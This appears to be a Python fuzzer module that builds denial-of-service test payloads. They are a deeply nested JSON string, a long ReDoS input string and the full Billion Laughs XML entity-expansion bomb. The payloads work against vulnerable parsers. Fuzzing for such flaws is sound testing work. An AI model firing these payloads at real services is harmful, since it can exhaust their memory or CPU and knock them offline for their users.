# engine/fuzzers/bomber.py

class AnvilComplexityBomber:
    """Generates payloads designed for Algorithmic Exhaustion (DoS)."""

    @staticmethod
    def get_payloads() -> list:
        payloads = []

        # 1. Deeply Nested JSON (Tests JSON parser stack overflow)
        nested_json = '{"a":' * 10000 + '1' + '}' * 10000
        payloads.append({
            "name": "Nested JSON Bomb",
            "type": "json",
            "payload": nested_json
        })

        # 2. ReDoS (Regular Expression Denial of Service)
        # Tests if validation regex engines lock up evaluating backtracking
        payloads.append({
            "name": "ReDoS String",
            "type": "string",
            "payload": "a" * 50000 + "X"
        })

        # 3. The Billion Laughs Attack (XML Entity Expansion)
        billion_laughs = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
         <!ENTITY lol "lol">
         <!ELEMENT lolz (#PCDATA)>
         <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
         <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
         <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
         <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
         <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
         <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
         <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
         <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
         <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>"""
        
        payloads.append({
            "name": "Billion Laughs XML",
            "type": "xml",
            "payload": billion_laughs
        })

        return payloads